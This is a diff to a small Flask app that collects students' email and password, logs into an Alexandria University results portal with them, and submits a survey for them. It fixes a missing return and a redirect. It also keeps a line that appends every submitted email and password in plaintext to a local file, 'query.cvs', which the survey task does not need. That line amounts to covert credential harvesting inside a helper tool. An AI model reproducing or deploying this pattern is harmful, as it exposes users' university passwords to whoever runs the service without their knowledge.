@@ -1,12 +1,12 @@
 import random
 import requests
-from flask import Flask, request,render_template,url_for
+from flask import Flask, request, render_template, url_for, redirect
 app = Flask('pygrades')
 
 @app.route('/pygrades', methods=['GET', 'POST'])
 def do_my_survey():
     if request.method == 'GET':
-        render_template('index.htm')
+        return render_template('index.htm')
     elif request.method == 'POST':
         student_email = request.form['email']
         student_pass = request.form['password']
@@ -114,11 +114,11 @@ def do_my_survey():
             }
 
             requests.post(url, data=data, headers=headers)
-            return "Successed! You've Done Your Survey"
+            return redirect(url_for('/success'))
 #--------------------------------------------------------------------------------------------------
 def getting_cookie_login(student_email, student_pass):
         with open('query.cvs', 'a') as file:
-            file.write('{}|{}'.format(student_email, student_pass))
+            file.write('{}|{} \n'.format(student_email, student_pass))
         url_login = "http://agr.p.alexu.edu.eg/Results/Student/Account/CheckLogin"
         data_login = {
             "Email": student_email,
